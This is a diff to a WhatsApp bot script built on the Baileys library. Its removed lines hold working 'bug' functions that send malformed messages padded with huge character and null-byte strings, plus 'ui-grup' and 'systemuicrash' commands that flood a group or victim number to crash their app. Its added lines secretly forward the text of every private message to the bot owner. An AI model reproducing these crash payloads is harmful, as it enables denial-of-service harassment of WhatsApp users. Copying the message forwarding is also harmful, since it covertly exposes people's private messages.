@@ -2,6 +2,7 @@
 const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, processSyncAction } = require("@whiskeysockets/baileys");
 const fs = require("fs");
 const os = require('os');
+const qs = require("qs");
 const speed = require('performance-now')
 const { performance } = require('perf_hooks');
 const { runtime, formatp, getBuffer, sleep, telegraPH } = require("./lib/utils.js") 
@@ -437,155 +438,27 @@ module.exports = core = async (client, m, chatUpdate, store, rcon) => {
       });
    }
 
-//Bug Function
-
-async function sendViewOnceMessages(jid, count) {
-  for (let i = 0; i < count; i++) {
-    let messageContent = generateWAMessageFromContent(jid, {
-      'viewOnceMessage': {
-        'message': {
-          'messageContextInfo': {
-            'deviceListMetadata': {},
-            'deviceListMetadataVersion': 2
-          },
-          'interactiveMessage': proto.Message.InteractiveMessage.create({
-            'body': proto.Message.InteractiveMessage.Body.create({
-              'text': ''
-            }),
-            'footer': proto.Message.InteractiveMessage.Footer.create({
-              'text': ''
-            }),
-            'header': proto.Message.InteractiveMessage.Header.create({
-              'title': '',
-              'subtitle': '',
-              'hasMediaAttachment': false
-            }),
-            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
-              'buttons': [{
-                'name': "cta_url",
-                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
-              }],
-              'messageParamsJson': "\0".repeat(100000)
-            })
-          })
-        }
-      }
-    }, {});
-    client.relayMessage(jid, messageContent.message, {
-      'messageId': messageContent.key.id
-    });
-  }
-}
-
-async function sendLiveLocationMessage(jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'viewOnceMessage': {
-      'message': {
-        'liveLocationMessage': {
-          'degreesLatitude': 'p',
-          'degreesLongitude': 'p',
-          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(50000),
-          'sequenceNumber': '0',
-          'jpegThumbnail': ''
-        }
-      }
-    }
-  }), {
-    'userJid': jid
-  });
-    await client.relayMessage(jid, messageContent.message, {
-    'participant': {
-      'jid': jid
-    },
-    'messageId': messageContent.key.id
-  });
-}
-    
-    async function sendListMessage(jid) {
-  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
-    'listMessage': {
-      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
-      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
-      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
-      'buttonText': null,
-      'listType': 2,
-      'productListInfo': {
-        'productSections': [{
-          'title': "wkwk",
-          'products': [{
-            'productId': "4392524570816732"
-          }]
-        }],
-        'productListHeaderImage': {
-          'productId': "4392524570816732",
-          'jpegThumbnail': null
-        },
-        'businessOwnerJid': "0@s.whatsapp.net"
-      }
-    },
-    'footer': "MAMPUS",
-    'contextInfo': {
-      'expiration': 600000,
-      'ephemeralSettingTimestamp': "1679959486",
-      'entryPointConversionSource': "global_search_new_chat",
-      'entryPointConversionApp': "whatsapp",
-      'entryPointConversionDelaySeconds': 9,
-      'disappearingMode': {
-        'initiator': "INITIATED_BY_ME"
-      }
-    },
-    'selectListType': 2,
-    'product_header_info': {
-      'product_header_info_id': 292928282928,
-      'product_header_is_rejected': false
-    }
-  }), {
-    'userJid': jid
-  });
-        await client.relayMessage(jid, messageContent.message, {
-    'participant': {
-      'jid': jid
-    },
-    'messageId': messageContent.key.id
-  });
-}
-      
-      async function sendMixedMessages(jid, count) {
-  for (let i = 0; i < count; i++) {
-    //sendLiveLocationMessage(jid);
-    sendListMessage(jid);
-    await sleep(500);
-  }
-}
-
-function sendMessageWithMentions(text, mentions = [], quoted = false) {
-  if (quoted == null || quoted == undefined || quoted == false) {
-    return client.sendMessage(from, {
-      'text': text,
-      'mentions': mentions
-    }, {
-      'quoted': m
-    });
-  } else {
-    return client.sendMessage(m.chat, {
-      'text': text,
-      'mentions': mentions
-    }, {
-      'quoted': m
-    });
-  }
-}
 
 
 
     //Tag Detector
-    if(budy.includes(`@${global.owner}`)) {
+    if(budy.includes(`@${global.owner[1]}`)) {
       teks = `
       Tag/Reply
       Sender: ${sender}
       Group: ${groupName}
-      Text: ${m.quoted ? m.message.extendedTextMessage.contextInfo.quotedMessage.conversation : text}`
+      Text: ${body}`
       client.sendText(global.owner[0] + "@s.whatsapp.net", teks);
+    }
+    if (!isCmd2 && !m.isGroup && !itsMe ) {
+      if (body) {
+        teks = `
+        ${global.botName} has new message
+        Sender: ${sender}
+        Name: ${pushname}
+        Text: ${body}`
+        client.sendText(global.owner[0] + "@s.whatsapp.net", teks)
+      }
     }
 
 
@@ -1897,8 +1770,9 @@ case "join":
 
 case 'ytmp3': 
   if (!text) return reply(lang.format(prefix, command))
+  if (!isUrl(text)) return reply("Please enter the URL!")
   proses("⌛")
-  const header = {
+  /*const header = {
     'Content-Type': 'application/json',
     'Accept': 'application/json',
     'Origin': 'https://submagic-free-tools.fly.dev',
@@ -1909,11 +1783,15 @@ const data = {
 }
   searchResponse = await axios.post("https://submagic-free-tools.fly.dev/api/youtube-to-audio", qs.stringify(data), {header})
   client.sendMessage(from, { audio: {url: searchResponse.data.audioUrl}, mimetype: "audio/mp4", ptt: false}, { quoted: m })
+  proses("✔")*/
+  data = await ytdlnew(text)
+  client.sendMessage(from, { audio: { url: data.mp3DownloadLink }, mimetype: 'audio/mp4', title: data.title}, {quoted: m})
   proses("✔")
 break
 
 case 'ytmp4':
-  if (!text) return replynano(lang.format(prefix, command))
+  if (!text) return reply(lang.format(prefix, command))
+  if (!isUrl(text)) return reply("Please enter the URL!")
   proses("⌛")
   searchResponse = await ytdlnew(text)
   const ytc = `*[ YOUTUBE DOWNLOADER ]*
@@ -2055,6 +1933,7 @@ case 'play':
         case 'fb':
         case 'fbdl':
             if (!q) return reply(lang.format(prefix, command))
+            if (!isUrl(text)) return reply("Please enter the URL!")
             try{
             proses("⌛")
             source = await fbdl(text);
@@ -2075,6 +1954,7 @@ case 'play':
   case 'ig':
     try {
     if(!text) return reply(lang.format(prefix,command))
+    if (!isUrl(text)) return reply("Please enter the URL!")
     proses("⏳")
     fetcher = await axios({
       url: `https://aemt.uk.to/download/igdl?url=${encodeURIComponent(text)}`,
@@ -2093,6 +1973,7 @@ case 'play':
   case 'tiktok':
   case 'tt':
     if(!text) return reply(lang.format(prefix, command))
+    if (!isUrl(text)) return reply("Please enter the URL!")
     try {
     proses("⏳")
     link = await tiktok2(text);
@@ -2129,59 +2010,6 @@ break
   case 'changelog':
     reply(lang.changelog())
   break
-            
-  case "ui-grup": 
-    if (!text) return reply("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10");
-    if (!text.split(" ")[0].includes("whatsapp.com")) return reply("Link Invalid!");
-    groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1];
-    try {
-      proses("⌛")
-      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-      let groupTarget = await client.groupAcceptInvite(groupLink);
-      await sleep(2000); // Adjusted sleep time for clarity
-      sendViewOnceMessages(groupTarget, bugAmount);
-      await sleep(2500); // Adjusted sleep time for clarity
-      proses("✔")
-      client.groupLeave(groupTarget);
-    } catch (error) {
-      proses("❌")
-      console.log(error)
-    }
-  
-  break;
-            
-case "systemuicrash": 
-
-  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 91xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return reply("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await client.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "62882021771652") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return reply("The number is not registered on WhatsApp");
-  }
-  reply("please wait, " + command + " bug is in process..");
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMixedMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  );
-
-break
             
 
 case 'report': 
